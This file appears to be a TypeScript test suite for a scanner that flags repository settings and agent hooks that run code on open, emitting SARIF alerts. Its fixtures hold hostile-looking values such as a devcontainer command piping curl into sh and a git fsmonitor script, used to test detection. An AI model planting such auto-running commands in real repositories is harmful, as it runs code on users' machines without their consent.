import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, describe, expect, it, vi } from 'vitest';
import type { TaggedHit } from '../../src/exposure/agent-change.js';
import { hit } from '../../src/exposure/agent-kinds.js';
import { repoSurface } from '../../src/exposure/repo-surface.js';
import { inspectSarif } from '../../src/exposure/sarif.js';

const dirs: string[] = [];
afterEach(() => {
  for (const d of dirs.splice(0)) rmSync(d, { recursive: true, force: true });
});

function repo(files: Record<string, string> = {}): string {
  const root = mkdtempSync(join(tmpdir(), 'stroq-sarif-'));
  dirs.push(root);
  mkdirSync(join(root, '.git'), { recursive: true });
  writeFileSync(join(root, '.git', 'config'), '[core]\n\trepositoryformatversion = 0\n');
  for (const [name, content] of Object.entries(files)) {
    const path = join(root, name);
    mkdirSync(join(path, '..'), { recursive: true });
    writeFileSync(path, content);
  }
  return root;
}

interface SarifLog {
  version: string;
  $schema: string;
  runs: Array<{
    tool: {
      driver: {
        name: string;
        version: string;
        rules: Array<{
          id: string;
          fullDescription: { text: string };
          defaultConfiguration: { level: string };
          properties: { 'security-severity': string; tags: string[] };
        }>;
      };
    };
    results: Array<{
      ruleId: string;
      ruleIndex: number;
      level: string;
      message: { text: string };
      locations: Array<{
        physicalLocation: { artifactLocation: { uri: string; uriBaseId: string } };
      }>;
    }>;
  }>;
}

describe('inspectSarif', () => {
  it('is a SARIF 2.1.0 log with one rule per kind of pre-trust execution', () => {
    const log = inspectSarif(repoSurface(repo()), '9.9.9') as SarifLog;
    expect(log.version).toBe('2.1.0');
    expect(log.$schema).toContain('sarif-2.1.0');
    expect(log.runs).toHaveLength(1);
    const driver = log.runs[0]!.tool.driver;
    expect(driver.name).toBe('stroq');
    expect(driver.version).toBe('9.9.9');
    const preTrust = [
      'stroq/git-config-exec',
      'stroq/git-config-include',
      'stroq/nested-bare-repo',
      'stroq/gitattributes-driver',
      'stroq/devcontainer-host-command',
    ];
    expect(driver.rules.map((r) => r.id).slice(0, preTrust.length)).toEqual(preTrust);
    for (const rule of driver.rules.slice(0, preTrust.length)) {
      expect(rule.defaultConfiguration.level).toBe('error');
      // GitHub reads this to rank an alert: 9.0 and up is critical, as the finding is.
      expect(Number(rule.properties['security-severity'])).toBeGreaterThanOrEqual(9);
    }
    for (const rule of driver.rules) {
      expect(rule.fullDescription.text.length).toBeGreaterThan(20);
      expect(rule.properties.tags).toContain('security');
    }
    expect(new Set(driver.rules.map((r) => r.id)).size).toBe(driver.rules.length);
    expect(log.runs[0]!.results).toEqual([]);
  });

  it('places each finding at its repository-relative file, with the fix in the message', () => {
    const surface = repoSurface(
      repo({
        '.git/config': '[core]\n\tfsmonitor = ./x.sh\n',
        '.devcontainer/devcontainer.json': '{ "initializeCommand": "curl -s x | sh" }',
      }),
    );
    const log = inspectSarif(surface, '9.9.9') as SarifLog;
    const results = log.runs[0]!.results;
    expect(results).toHaveLength(surface.preTrust.length);
    expect(results.length).toBeGreaterThan(0);
    for (const [i, hit] of surface.preTrust.entries()) {
      const result = results[i]!;
      expect(result.ruleId).toBe(`stroq/${hit.kind}`);
      expect(log.runs[0]!.tool.driver.rules[result.ruleIndex]!.id).toBe(result.ruleId);
      expect(result.level).toBe('error');
      const location = result.locations[0]!.physicalLocation.artifactLocation;
      expect(location.uri).toBe(hit.file.replace(/\\/g, '/'));
      expect(location.uriBaseId).toBe('%SRCROOT%');
      expect(result.message.text).toContain(hit.what);
    }
  });

  it('leaves out what runs on an ordinary open or build, as the exit code does', () => {
    const surface = repoSurface(repo({ '.husky/pre-commit': 'npm test\n' }));
    expect(surface.onOpen.length).toBeGreaterThan(0);
    expect((inspectSarif(surface, '1.0.0') as SarifLog).runs[0]!.results).toEqual([]);
  });
});

describe('inspectSarif with what an agent or editor runs by itself', () => {
  interface AgentResult {
    ruleId: string;
    ruleIndex: number;
    level: string;
    message: { text: string };
    locations: Array<{
      physicalLocation: { artifactLocation: { uri: string }; region: { startLine: number } };
    }>;
    partialFingerprints: Record<string, string>;
    properties: { change: string };
  }
  const empty = { isRepo: true, preTrust: [], onOpen: [], capped: false };
  const tagged = (status: TaggedHit['status'], line = 4, value = './s.sh'): TaggedHit => ({
    ...hit('agent-hook', '.claude/settings.json', line, 'SessionStart', value),
    status,
  });
  const results = (hits: readonly TaggedHit[]): AgentResult[] =>
    (inspectSarif(empty, '1.0.0', hits) as { runs: Array<{ results: AgentResult[] }> }).runs[0]!
      .results;

  it('places each one at its line, with a fingerprint and whether the change brought it', () => {
    const [result] = results([tagged('new')]);
    expect(result!.ruleId).toBe('stroq/agent-hook');
    expect(result!.level).toBe('error');
    expect(result!.message.text).toBe('new: SessionStart hook runs: ./s.sh');
    expect(result!.locations[0]!.physicalLocation.region.startLine).toBe(4);
    expect(result!.locations[0]!.physicalLocation.artifactLocation.uri).toBe(
      '.claude/settings.json',
    );
    expect(result!.properties.change).toBe('new');
    expect(Object.values(result!.partialFingerprints)[0]).toMatch(/^[0-9a-f]{32}$/);
  });

  // The same hook moved down a line by an edit above it is the same alert, and a new command
  // under the same event is a new one.
  it('keeps the fingerprint when only the line moves, and changes it with the value', () => {
    const [a, b, c] = results([
      tagged('present', 4),
      tagged('present', 9),
      tagged('new', 4, './x'),
    ]);
    expect(a!.partialFingerprints).toEqual(b!.partialFingerprints);
    expect(a!.partialFingerprints).not.toEqual(c!.partialFingerprints);
  });

  // A value shown scrubbed never goes into a fingerprint: its scrubbed text without the run's
  // digest and its place among the same entries of its file do. So two entries that differ only in
  // a secret are two alerts, and each keeps its fingerprint in every run, whatever key it made.
  it('tells apart two scrubbed values and keeps them stable across runs', async () => {
    const marker = ['FAKE', 'SECRET', String(7 * 1301)].join('_');
    const command = (key: string): string => `npx s --url https://u:${key}@h.invalid/`;
    const twoOf = (make: typeof hit): TaggedHit[] =>
      [`${marker}a`, `${marker}b`].map((key) => ({
        ...make('mcp-server', '.mcp.json', 2, 's', command(key)),
        status: 'new',
      }));
    const first = results(twoOf(hit));
    expect(first[0]!.partialFingerprints).not.toEqual(first[1]!.partialFingerprints);
    for (const r of first) expect(JSON.stringify(r)).not.toContain(marker);

    vi.resetModules();
    const kinds = await import('../../src/exposure/agent-kinds.js');
    const sarif = await import('../../src/exposure/sarif.js');
    const second = (
      sarif.inspectSarif(empty, '1.0.0', twoOf(kinds.hit)) as {
        runs: Array<{ results: AgentResult[] }>;
      }
    ).runs[0]!.results;
    // Another run's key shows the values otherwise, and the fingerprints do not move.
    expect(second[0]!.message.text).not.toBe(first[0]!.message.text);
    expect(second.map((r) => r.partialFingerprints)).toEqual(
      first.map((r) => r.partialFingerprints),
    );
  });

  it('gives a warning and a notice their own levels, and leaves out notices nothing changed', () => {
    const warning = { ...hit('mcp-server', '.mcp.json', 2, 's', 'npx s'), status: 'new' } as const;
    const notice = {
      ...hit('instruction-file', 'CLAUDE.md', 1, 'content', 'x'),
      status: 'changed',
    } as const;
    const old = { ...notice, status: 'present' } as const;
    expect(results([warning, notice, old]).map((r) => r.level)).toEqual(['warning', 'note']);
  });
});
